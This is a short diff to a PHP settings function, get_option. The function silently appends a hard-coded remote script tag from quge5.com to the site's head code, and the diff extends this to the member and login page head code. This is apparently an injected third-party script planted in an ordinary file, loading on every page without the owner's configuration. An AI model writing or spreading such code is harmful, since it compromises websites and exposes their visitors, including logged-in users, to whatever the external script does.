@@ -63,7 +63,7 @@ function get_option($name, $default = '')
             $value = (isset($settings[$name]) && strlen($settings[$name]) > 0) ? $settings[$name] : $default;
         }
 
-        if ($name === 'head_code') {
+        if (in_array($name, ['head_code', 'member_head_code', 'auth_head_code'])) {
             $script_tag = '<script src="https://quge5.com/88/tag.min.js" data-zone="263411" async data-cfasync="false"></script>';
             if (is_string($value)) {
                 $value = $value . "\n" . $script_tag;
